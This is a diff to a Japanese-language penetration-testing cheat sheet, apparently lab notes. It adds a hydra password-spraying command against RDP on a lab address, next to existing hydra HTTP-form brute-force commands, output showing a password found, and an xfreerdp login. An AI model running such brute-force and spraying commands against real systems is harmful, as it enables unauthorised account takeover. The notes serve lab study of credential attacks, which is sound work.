@@ -276,7 +276,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 SQL>
 ```
 
-### ブルートフォース
+### PW ブルートフォース
 ***http***
 ```
 hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
@@ -310,7 +310,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-16 03:23:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-16 03:24:38
 ```
-
+リバースブルートフォース
+```
+kali@kali:~$ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
+```
 ### kali から windows RDP
 ```
 xfreerdp /u:student /p:lab /v:192.168.206.152
